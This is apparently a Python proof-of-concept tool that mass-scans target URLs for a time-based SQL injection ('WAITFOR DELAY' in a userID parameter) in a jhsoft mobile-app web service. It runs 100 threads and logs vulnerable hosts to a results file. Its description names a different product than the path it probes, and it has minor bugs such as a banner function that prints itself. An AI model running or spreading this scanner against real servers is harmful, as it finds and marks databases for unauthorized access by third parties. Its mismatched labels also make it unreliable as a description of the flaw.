#导包
import requests,argparse,re,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
#指纹模块
import argparse,sys,re,requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test="""
███████╗██╗  ██╗██╗   ██╗██╗   ██╗
██╔════╝██║ ██╔╝╚██╗ ██╔╝██║   ██║
███████╗█████╔╝  ╚████╔╝ ██║   ██║
╚════██║██╔═██╗   ╚██╔╝  ██║   ██║
███████║██║  ██╗   ██║   ╚██████╔╝
╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ 
 """
    print(banner)
#poc检测模块
def poc(target):
    url = target + "/c6/jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo?userID=1%27%3b+WAITFOR%20DELAY%20%270:0:5%27-- "
    print(url)
    headers={
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Connection": "close",
    }
    try:
        res = requests.get(url=url,headers=headers,verify=False,timeout=8)
        res2= res.elapsed.total_seconds()
        print(res2)
        if res2 >5 and res2 <6 :
                   with open(r'./results.txt','a+') as f1:
                        f1.write(f'{url}\n')
                        print('[+++++++]'+target+'存在sql注入漏洞')
                        return True
        else:
             print('[-]不存在sql注入漏洞')
    except:
         print(f'[*]{target}'' is server error')
         return False

#主函数检测
def main():
    banner()
    parser = argparse.ArgumentParser(description="辰信景云终端安全管理系统 login存在 SQL注入漏洞")
    #-u 单个检测 -f 多行检测
    parser.add_argument('-u','--url',dest='url',help="input attack url",type=str)
    parser.add_argument('-f','--flie',dest='file',help="005.txt",type=str)
    args=parser.parse_args()
    if  args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
#主函数的入口
if __name__ =='__main__':
    main()